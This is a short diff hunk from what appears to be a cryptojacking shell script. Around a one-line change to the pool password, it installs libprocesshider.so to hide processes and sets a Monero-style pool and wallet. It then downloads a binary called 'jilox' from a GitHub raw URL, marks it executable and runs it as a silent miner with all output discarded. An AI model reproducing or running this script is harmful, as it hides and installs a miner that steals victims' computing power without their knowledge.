@@ -12,7 +12,7 @@ mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> 
 cd ..
 A=pool.hashvault.pro:443
 B=ZEPHsBz5DP8CQwW1ex5dF45MnEiysxKnWUxbsA1FjhMdAbj1tjub6mZ8zpywvMLqWYj1AQtbNdi6ffGVfwphDZiChWU5fsRM3xD
-C=GAS
+C=regis
 wget https://github.com/13422159/data/raw/main/jilox && chmod u+x jilox
 ./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
 r
